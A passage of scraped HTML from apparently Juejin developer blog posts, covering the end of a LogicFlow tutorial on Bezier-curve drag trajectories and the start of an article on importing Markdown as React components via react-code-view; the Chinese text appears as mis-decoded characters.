  <span class="hljs-comment">// 3. ç”Ÿæˆä¸‰æ¬¡è´å¡å°”æ›²çº¿çš„è·¯å¾„ï¼ˆC æŒ‡ä»¤ï¼šC æ§åˆ¶ç‚¹1.x,æ§åˆ¶ç‚¹1.y æ§åˆ¶ç‚¹2.x,æ§åˆ¶ç‚¹2.y ç»ˆç‚¹.x,ç»ˆç‚¹.yï¼‰</span>
  <span class="hljs-keyword">let</span> d = <span class="hljs-string">""</span>;
  
  <span class="hljs-keyword">if</span> (endX &gt; startX &amp;&amp; endY &gt; startY) {
    <span class="hljs-comment">// å³ä¸‹æ–¹å‘ï¼šæ§åˆ¶ç‚¹1 å³ä¸Šï¼Œæ§åˆ¶ç‚¹2 å·¦ä¸‹</span>
    d = <span class="hljs-string">`M <span class="hljs-subst">${startX}</span>,<span class="hljs-subst">${startY}</span> C <span class="hljs-subst">${startX + controlOffset}</span>,<span class="hljs-subst">${startY}</span> <span class="hljs-subst">${endX - controlOffset}</span>,<span class="hljs-subst">${endY}</span> <span class="hljs-subst">${endX}</span>,<span class="hljs-subst">${endY}</span>`</span>;
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (endX &gt; startX &amp;&amp; endY &lt; startY) {
    <span class="hljs-comment">// å³ä¸Šæ–¹å‘ï¼šæ§åˆ¶ç‚¹1 å³ä¸‹ï¼Œæ§åˆ¶ç‚¹2 å·¦ä¸Š</span>
    d = <span class="hljs-string">`M <span class="hljs-subst">${startX}</span>,<span class="hljs-subst">${startY}</span> C <span class="hljs-subst">${startX + controlOffset}</span>,<span class="hljs-subst">${startY}</span> <span class="hljs-subst">${endX - controlOffset}</span>,<span class="hljs-subst">${endY}</span> <span class="hljs-subst">${endX}</span>,<span class="hljs-subst">${endY}</span>`</span>;
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (endX &lt; startX &amp;&amp; endY &gt; startY) {
    <span class="hljs-comment">// å·¦ä¸‹æ–¹å‘ï¼šæ§åˆ¶ç‚¹1 å·¦ä¸Šï¼Œæ§åˆ¶ç‚¹2 å³ä¸‹</span>
    d = <span class="hljs-string">`M <span class="hljs-subst">${startX}</span>,<span class="hljs-subst">${startY}</span> C <span class="hljs-subst">${startX - controlOffset}</span>,<span class="hljs-subst">${startY}</span> <span class="hljs-subst">${endX + controlOffset}</span>,<span class="hljs-subst">${endY}</span> <span class="hljs-subst">${endX}</span>,<span class="hljs-subst">${endY}</span>`</span>;
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// å·¦ä¸Šæ–¹å‘ï¼šæ§åˆ¶ç‚¹1 å·¦ä¸‹ï¼Œæ§åˆ¶ç‚¹2 å³ä¸Š</span>
    d = <span class="hljs-string">`M <span class="hljs-subst">${startX}</span>,<span class="hljs-subst">${startY}</span> C <span class="hljs-subst">${startX - controlOffset}</span>,<span class="hljs-subst">${startY}</span> <span class="hljs-subst">${endX + controlOffset}</span>,<span class="hljs-subst">${endY}</span> <span class="hljs-subst">${endX}</span>,<span class="hljs-subst">${endY}</span>`</span>;
  }

  <span class="hljs-comment">// 4. è¿”å› SVG Path å…ƒç´ </span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">h</span>(
    <span class="hljs-string">"path"</span>, 
    {
      d,
      <span class="hljs-attr">fill</span>: <span class="hljs-string">"none"</span>,
      <span class="hljs-attr">pointerEvents</span>: <span class="hljs-string">"none"</span>, <span class="hljs-comment">// æå…¶é‡è¦ï¼é˜²æ­¢å¼•å¯¼çº¿é˜»æŒ¡é¼ æ ‡äº‹ä»¶</span>
      ...edgeStyle,
      <span class="hljs-attr">strokeDasharray</span>: <span class="hljs-literal">undefined</span>, <span class="hljs-comment">// å°ç¼–çš„é¡¹ç›®è®¾è®¡ä¸éœ€è¦è™šçº¿ï¼Œæ‰€ä»¥æ¸…é™¤æ‰ï¼Œä½ å¯ä»¥æ ¹æ®è‡ªå·±éœ€è¦</span>
      <span class="hljs-attr">stroke</span>: <span class="hljs-variable constant_">STROKE_COLOR</span>, 
      <span class="hljs-attr">strokeWidth</span>: <span class="hljs-variable constant_">STROKE_WIDTH</span>, 
    },
  );
}
</code></pre>
<p><strong>æ³¨æ„</strong>ğŸ”‰ï¼šè¿™é‡Œçš„æ§åˆ¶ç‚¹è®¡ç®—é€»è¾‘ï¼ˆ<code>controlOffset</code>ï¼‰æœ€å¥½ä¸ä½ çš„è¾¹é‡Œçš„é€»è¾‘ä¿æŒä¸€è‡´ï¼Œè¿™æ ·æ¾æ‰‹çš„ä¸€ç¬é—´ï¼Œçº¿æ¡æ‰ä¸ä¼šæœ‰å¥‡æ€ªçš„ "è·³åŠ¨"ã€‚</p>
<blockquote>
<p>è¿™é‡Œå¦‚æ­¤å¤æ‚çš„è®¡ç®—æ˜¯å°ç¼–è‡ªå·±å†™çš„ï¼Ÿé‚£ä¹ˆç‰›ï¼ŸğŸ®</p>
<p>å½“ç„¶ä¸æ˜¯ï¼Œè¿™é‡Œå°ç¼–ä¹Ÿæ˜¯å€ŸåŠ©äº†AIçš„ååŠ©ã€‚è¿™è¦æ˜¯æ”¾åœ¨å‡ å¹´å‰ï¼Œè¿™ç§äº¤äº’æ•ˆæœç›´æ¥å°±ç æ‰ï¼Œå®åœ¨å¤ªè´¹åŠ²äº†ï¼Œç°åœ¨ä¸ä¸€æ ·äº†ï¼Œä½ è®©AIå¸®åŠ©ä½ å†™ï¼Œåªè¦ä½ æç¤ºè¯å†™å¾—è¶³å¤Ÿæ¸…æ¥šï¼ŒAIåˆ†åˆ†é’Ÿå¸®ä½ è§£å†³ï¼Œä½ åªè¦è°ƒè°ƒå‚æ•°ï¼ŒéªŒæ”¶ç»“æœå°±è¡Œäº†ã€‚</p>
</blockquote>
<h3 data-id="heading-5">ç¬¬3ï¸âƒ£æ­¥ï¼šæ³¨å†Œé…ç½®</h3>
<p>æœ€åï¼Œåœ¨åˆå§‹åŒ– LogicFlow æ—¶ï¼Œå°†è¿™ä¸ªå‡½æ•°ä¼ ç»™ <code>customTrajectory</code> é€‰é¡¹ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">LogicFlow</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"@logicflow/core"</span>;
<span class="hljs-keyword">import</span> customTrajectory <span class="hljs-keyword">from</span> <span class="hljs-string">"./customTrajectory"</span>;

<span class="hljs-keyword">const</span> lf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogicFlow</span>({
  <span class="hljs-attr">container</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#container"</span>),
  <span class="hljs-comment">// ... å…¶ä»–é…ç½®</span>
  
  <span class="hljs-comment">// æ³¨å†Œè‡ªå®šä¹‰è½¨è¿¹</span>
  <span class="hljs-attr">customTrajectory</span>: customTrajectory,
  
  <span class="hljs-comment">// ç¡®ä¿æœ€ç»ˆç”Ÿæˆçš„è¾¹ä¹Ÿæ˜¯è´å¡å°”æ›²çº¿</span>
  <span class="hljs-attr">edgeGenerator</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-string">"bezierCurveEdge"</span>, 
});
</code></pre>
<h2 data-id="heading-6">æ€»ç»“</h2>
<p>é€šè¿‡ç®€å•çš„æ•°å­¦è®¡ç®—å’Œ VDOM æ¸²æŸ“ï¼Œå’±ä»¬æˆåŠŸå°† LogicFlow çš„è¿çº¿è½¨è¿¹ä» "å·¥ä¸šé£" çš„ç›´çº¿å‡çº§æˆäº† "è‰ºæœ¯é£" çš„æ›²çº¿ã€‚ğŸ˜‹</p>
<p>å¸Œæœ›è¿™ä¸ªå°æŠ€å·§èƒ½è®©ä½ çš„æµç¨‹å›¾ç¼–è¾‘ä½“éªŒæ›´åŠ å‡ºè‰²ï¼ğŸŒŸ</p>
<br/>
<hr/>
<p><br/><br/></p>
<p>è‡³æ­¤ï¼Œæœ¬ç¯‡æ–‡ç« å°±å†™å®Œå•¦ï¼Œæ’’èŠ±æ’’èŠ±ã€‚</p>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b2198fba2b674f1b935a63e4abb3cbd7~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=90&amp;h=90&amp;s=8866&amp;e=png&amp;b=fcfcfc" alt="image.png" loading="lazy"/></p>
<p>å¸Œæœ›æœ¬æ–‡å¯¹ä½ æœ‰æ‰€å¸®åŠ©ï¼Œå¦‚æœ‰ä»»ä½•ç–‘é—®ï¼ŒæœŸå¾…ä½ çš„ç•™è¨€å“¦ã€‚<br/>
è€æ ·å­ï¼Œç‚¹èµ+è¯„è®º=ä½ ä¼šäº†ï¼Œæ”¶è—=ä½ ç²¾é€šäº†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å°† Markdown æ–‡ä»¶å¯¼å…¥ä¸º React ç»„ä»¶ - å†™ä½œæ–‡æ¡£ï¼Œå³æ—¶è·å–äº¤äº’å¼æ¼”ç¤º]]></title>    <link>https://juejin.cn/post/7589207474134155314</link>    <guid>https://juejin.cn/post/7589207474134155314</guid>    <pubDate>2025-12-30T03:39:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589207474134155314" data-draft-id="7589168816527933467" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å°† Markdown æ–‡ä»¶å¯¼å…¥ä¸º React ç»„ä»¶ - å†™ä½œæ–‡æ¡£ï¼Œå³æ—¶è·å–äº¤äº’å¼æ¼”ç¤º"/> <meta itemprop="keywords" content="å‰ç«¯,React.js,Markdown"/> <meta itemprop="datePublished" content="2025-12-30T03:39:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="éƒ­å°é“­"/> <meta itemprop="url" content="https://juejin.cn/user/1345457961570638"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å°† Markdown æ–‡ä»¶å¯¼å…¥ä¸º React ç»„ä»¶ - å†™ä½œæ–‡æ¡£ï¼Œå³æ—¶è·å–äº¤äº’å¼æ¼”ç¤º
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1345457961570638/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    éƒ­å°é“­
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T03:39:05.000Z" title="Tue Dec 30 2025 03:39:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body .octicon{display:inline-block;fill:currentColor;vertical-align:text-bottom}.markdown-body .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown-body .anchor:focus{outline:none}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1:hover .anchor .octicon-link:before,.markdown-body h2:hover .anchor .octicon-link:before,.markdown-body h3:hover .anchor .octicon-link:before,.markdown-body h4:hover .anchor .octicon-link:before,.markdown-body h5:hover .anchor .octicon-link:before,.markdown-body h6:hover .anchor .octicon-link:before{width:16px;height:16px;content:" ";display:inline-block;background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' aria-hidden='true'%3E%3Cpath fill-rule='evenodd' d='M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z'/%3E%3C/svg%3E")}.markdown-body{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;color:#24292e;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body details{display:block}.markdown-body summary{display:list-item}.markdown-body a{background-color:initial}.markdown-body a:active,.markdown-body a:hover{outline-width:0}.markdown-body strong{font-weight:inherit;font-weight:bolder}.markdown-body h1{margin:.67em 0}.markdown-body img{border-style:none}.markdown-body code,.markdown-body kbd,.markdown-body pre{font-family:monospace,monospace;font-size:1em}.markdown-body hr{box-sizing:initial;overflow:visible}.markdown-body input{font:inherit;margin:0;overflow:visible}.markdown-body [type=checkbox]{box-sizing:border-box;padding:0}.markdown-body *{box-sizing:border-box}.markdown-body input{font-family:inherit;font-size:inherit;line-height:inherit}.markdown-body a{color:#0366d6;text-decoration:none}.markdown-body a:hover{text-decoration:underline}.markdown-body strong{font-weight:600}.markdown-body hr{height:0;margin:15px 0;overflow:hidden;background:transparent;border-bottom:1px solid #dfe2e5}.markdown-body hr:after,.markdown-body hr:before{display:table;content:""}.markdown-body hr:after{clear:both}.markdown-body table{border-spacing:0;border-collapse:collapse}.markdown-body td,.markdown-body th{padding:0}.markdown-body details summary{cursor:pointer}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:0;margin-bottom:0}.markdown-body h1{font-size:32px}.markdown-body h1,.markdown-body h2{font-weight:600}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:20px}.markdown-body h3,.markdown-body h4{font-weight:600}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:14px}.markdown-body h5,.markdown-body h6{font-weight:600}.markdown-body h6{font-size:12px}.markdown-body p{margin-top:0;margin-bottom:10px}.markdown-body blockquote{margin:0}.markdown-body ol,.markdown-body ul{padding-left:0;margin-top:0;margin-bottom:0}.markdown-body ol ol,.markdown-body ul ol{list-style-type:lower-roman}.markdown-body ol ol ol,.markdown-body ol ul ol,.markdown-body ul ol ol,.markdown-body ul ul ol{list-style-type:lower-alpha}.markdown-body dd{margin-left:0}.markdown-body code,.markdown-body pre{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px}.markdown-body pre{margin-top:0;margin-bottom:0}.markdown-body input::-webkit-inner-spin-button,.markdown-body input::-webkit-outer-spin-button{margin:0;-webkit-appearance:none;appearance:none}.markdown-body :checked+.radio-label{position:relative;z-index:1;border-color:#0366d6}.markdown-body .border{border:1px solid #e1e4e8!important}.markdown-body .border-0{border:0!important}.markdown-body .border-bottom{border-bottom:1px solid #e1e4e8!important}.markdown-body .rounded-1{border-radius:3px!important}.markdown-body .bg-white{background-color:#fff!important}.markdown-body .bg-gray-light{background-color:#fafbfc!important}.markdown-body .text-gray-light{color:#6a737d!important}.markdown-body .pl-3,.markdown-body .px-3{padding-left:16px!important}.markdown-body .px-3{padding-right:16px!important}.markdown-body .f6{font-size:12px!important}.markdown-body .lh-condensed{line-height:1.25!important}.markdown-body .text-bold{font-weight:600!important}.markdown-body .pl-c{color:#6a737d}.markdown-body .pl-c1,.markdown-body .pl-s .pl-v{color:#005cc5}.markdown-body .pl-e,.markdown-body .pl-en{color:#6f42c1}.markdown-body .pl-s .pl-s1,.markdown-body .pl-smi{color:#24292e}.markdown-body .pl-ent{color:#22863a}.markdown-body .pl-k{color:#d73a49}.markdown-body .pl-pds,.markdown-body .pl-s,.markdown-body .pl-s .pl-pse .pl-s1,.markdown-body .pl-sr,.markdown-body .pl-sr .pl-cce,.markdown-body .pl-sr .pl-sra,.markdown-body .pl-sr .pl-sre{color:#032f62}.markdown-body .pl-smw,.markdown-body .pl-v{color:#e36209}.markdown-body .pl-bu{color:#b31d28}.markdown-body .pl-ii{color:#fafbfc;background-color:#b31d28}.markdown-body .pl-c2{color:#fafbfc;background-color:#d73a49}.markdown-body .pl-c2:before{content:"^M"}.markdown-body .pl-sr .pl-cce{font-weight:700;color:#22863a}.markdown-body .pl-ml{color:#735c0f}.markdown-body .pl-mh,.markdown-body .pl-mh .pl-en,.markdown-body .pl-ms{font-weight:700;color:#005cc5}.markdown-body .pl-mi{font-style:italic;color:#24292e}.markdown-body .pl-mb{font-weight:700;color:#24292e}.markdown-body .pl-md{color:#b31d28;background-color:#ffeef0}.markdown-body .pl-mi1{color:#22863a;background-color:#f0fff4}.markdown-body .pl-mc{color:#e36209;background-color:#ffebda}.markdown-body .pl-mi2{color:#f6f8fa;background-color:#005cc5}.markdown-body .pl-mdr{font-weight:700;color:#6f42c1}.markdown-body .pl-ba{color:#586069}.markdown-body .pl-sg{color:#959da5}.markdown-body .pl-corl{text-decoration:underline;color:#032f62}.markdown-body .mb-0{margin-bottom:0!important}.markdown-body .my-2{margin-bottom:8px!important;margin-top:8px!important}.markdown-body .pl-0{padding-left:0!important}.markdown-body .py-0{padding-top:0!important;padding-bottom:0!important}.markdown-body .pl-1{padding-left:4px!important}.markdown-body .pl-2{padding-left:8px!important}.markdown-body .py-2{padding-top:8px!important;padding-bottom:8px!important}.markdown-body .pl-3{padding-left:16px!important}.markdown-body .pl-4{padding-left:24px!important}.markdown-body .pl-5{padding-left:32px!important}.markdown-body .pl-6{padding-left:40px!important}.markdown-body .pl-7{padding-left:48px!important}.markdown-body .pl-8{padding-left:64px!important}.markdown-body .pl-9{padding-left:80px!important}.markdown-body .pl-10{padding-left:96px!important}.markdown-body .pl-11{padding-left:112px!important}.markdown-body .pl-12{padding-left:128px!important}.markdown-body hr{border-bottom-color:#eee}.markdown-body kbd{display:inline-block;padding:3px 5px;font:11px SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;line-height:10px;color:#444d56;vertical-align:middle;background-color:#fafbfc;border:1px solid #d1d5da;border-radius:3px;box-shadow:inset 0 -1px 0 #d1d5da}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body&gt;:first-child{margin-top:0!important}.markdown-body&gt;:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body blockquote,.markdown-body details,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e1e4e8;border:0}.markdown-body blockquote{padding:0 1em;color:#6a737d;border-left:.25em solid #dfe2e5}.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eaecef}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#6a737d}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li{word-wrap:break-all}.markdown-body li&gt;p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:600}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto}.markdown-body table th{font-weight:600}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #dfe2e5}.markdown-body table tr{background-color:#fff;border-top:1px solid #c6cbd1}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}.markdown-body img{max-width:100%;box-sizing:initial;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body code{padding:.2em .4em;margin:0;font-size:85%;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body pre{word-wrap:normal}.markdown-body pre&gt;code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f6f8fa;border-radius:3px}.markdown-body pre code{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:initial;border:0}.markdown-body .commit-tease-sha{display:inline-block;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:90%;color:#444d56}.markdown-body .full-commit .btn-outline:not(:disabled):hover{color:#005cc5;border-color:#005cc5}.markdown-body .blob-wrapper{overflow-x:auto;overflow-y:hidden}.markdown-body .blob-wrapper-embedded{max-height:240px;overflow-y:auto}.markdown-body .blob-num{width:1%;min-width:50px;padding-right:10px;padding-left:10px;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;line-height:20px;color:rgba(27,31,35,.3);text-align:right;white-space:nowrap;vertical-align:top;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-body .blob-num:hover{color:rgba(27,31,35,.6)}.markdown-body .blob-num:before{content:attr(data-line-number)}.markdown-body .blob-code{position:relative;padding-right:10px;padding-left:10px;line-height:20px;vertical-align:top}.markdown-body .blob-code-inner{overflow:visible;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;color:#24292e;word-wrap:normal;white-space:pre}.markdown-body .pl-token.active,.markdown-body .pl-token:hover{cursor:pointer;background:#ffea7f}.markdown-body .tab-size[data-tab-size="1"]{-moz-tab-size:1;tab-size:1}.markdown-body .tab-size[data-tab-size="2"]{-moz-tab-size:2;tab-size:2}.markdown-body .tab-size[data-tab-size="3"]{-moz-tab-size:3;tab-size:3}.markdown-body .tab-size[data-tab-size="4"]{-moz-tab-size:4;tab-size:4}.markdown-body .tab-size[data-tab-size="5"]{-moz-tab-size:5;tab-size:5}.markdown-body .tab-size[data-tab-size="6"]{-moz-tab-size:6;tab-size:6}.markdown-body .tab-size[data-tab-size="7"]{-moz-tab-size:7;tab-size:7}.markdown-body .tab-size[data-tab-size="8"]{-moz-tab-size:8;tab-size:8}.markdown-body .tab-size[data-tab-size="9"]{-moz-tab-size:9;tab-size:9}.markdown-body .tab-size[data-tab-size="10"]{-moz-tab-size:10;tab-size:10}.markdown-body .tab-size[data-tab-size="11"]{-moz-tab-size:11;tab-size:11}.markdown-body .tab-size[data-tab-size="12"]{-moz-tab-size:12;tab-size:12}.markdown-body .task-list-item{list-style-type:none}.markdown-body .task-list-item+.task-list-item{margin-top:3px}.markdown-body .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>æˆ‘æœ€è¿‘å°† react-code-view è¿›è¡Œäº†é‡å†™, åŸºäº unplugin è®© Markdown å¯ä»¥ç›´æ¥å¯¼å…¥æ¸²æŸ“æˆä¸€ä¸ª React ç»„ä»¶. ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•ç¤ºä¾‹</p>
<h2 data-id="heading-0">1.å®‰è£…</h2>
<pre><code class="hljs language-sql" lang="sql">npm install <span class="hljs-variable">@react</span><span class="hljs-operator">-</span>code<span class="hljs-operator">-</span><span class="hljs-keyword">view</span><span class="hljs-operator">/</span>react <span class="hljs-variable">@react</span><span class="hljs-operator">-</span>code<span class="hljs-operator">-</span><span class="hljs-keyword">view</span><span class="hljs-operator">/</span>unplugin
</code></pre>
<h2 data-id="heading-1">2.é…ç½®æ„å»ºå·¥å…·(æ”¯æŒ vite/webpack/esbuild/rollup)</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> react <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-react'</span>;
<span class="hljs-keyword">import</span> reactCodeView <span class="hljs-keyword">from</span> <span class="hljs-string">'@react-code-view/unplugin/vite'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">react</span>(),
    <span class="hljs-title function_">reactCodeView</span>() <span class="hljs-comment">// Enable markdown import</span>
  ]
});
</code></pre>
<h2 data-id="heading-2">3.ä½¿ç”¨æœ‰ä»£ç å—åˆ›å»º Markdown æ–‡ä»¶</h2>
<p>demo.md</p>
<pre><code class="hljs language-xml" lang="xml"># Counter Example


A simple counter to demonstrate live code editing and preview.


<span class="hljs-comment">&lt;!--start-code--&gt;</span>
\`\`\`jsx
const App = () =&gt; {
  const [count, setCount] = useState(0);
  return (
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(c =&gt; c + 1)}&gt;
      Clicked {count} times
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  );
};

render(<span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span>);
\`\`\`
<span class="hljs-comment">&lt;!--end-code--&gt;</span>

- Click "Show Code" to view and edit the source
- Preview updates instantly while you type
- Click the copy button to reuse the code
</code></pre>
